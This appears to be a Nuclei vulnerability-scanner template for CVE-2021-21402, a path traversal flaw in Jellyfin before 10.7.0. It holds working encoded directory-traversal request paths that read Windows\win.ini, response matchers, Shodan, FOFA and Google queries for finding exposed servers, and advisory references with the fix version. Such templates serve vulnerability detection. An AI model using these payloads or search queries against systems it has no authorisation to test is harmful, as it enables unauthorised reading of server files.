http:
- matchers:
  - part: header
    type: word
    words:
    - 'Content-Type: application/octet-stream'
  - part: body
    regex:
    - \[(font|extension|file)s\]
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/'
  - '{{BaseURL}}/Videos/1/hls/m/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/'
id: CVE-2021-21402
info:
  author: dwisiswant0
  classification:
    cpe: cpe:2.3:a:jellyfin:jellyfin:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-21402
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 6.5
    cwe-id: CWE-22
    epss-percentile: 0.99744
    epss-score: 0.9275
  description: 'Jellyfin before 10.7.0 is vulnerable to local file inclusion. This
    issue is more prevalent when Windows is used as the host OS. Servers exposed to
    public Internet are potentially at risk.

    '
  impact: 'Successful exploitation could allow an attacker to read sensitive files
    on the server.

    '
  metadata:
    fofa-query:
    - title="Jellyfin" || body="http://jellyfin.media"
    - title="jellyfin"
    - body="jellyfin"
    - title="jellyfin" || body="http://jellyfin.media"
    google-query: intitle:"jellyfin"
    max-request: 2
    product: jellyfin
    shodan-query:
    - http.html:"Jellyfin"
    - http.html:"jellyfin"
    - http.title:"jellyfin"
    vendor: jellyfin
    verified: true
  name: Jellyfin <10.7.0 - Local File Inclusion
  reference:
  - https://securitylab.github.com/advisories/GHSL-2021-050-jellyfin/
  - https://github.com/jellyfin/jellyfin/security/advisories/GHSA-wg4c-c9g9-rxhx
  - https://github.com/jellyfin/jellyfin/releases/tag/v10.7.1
  - https://github.com/jellyfin/jellyfin/commit/0183ef8e89195f420c48d2600bc0b72f6d3a7fd7
  - https://nvd.nist.gov/vuln/detail/CVE-2021-21402
  remediation: This is fixed in version 10.7.1.
  severity: medium
  tags: cve,cve2021,jellyfin,lfi,vkev,vuln
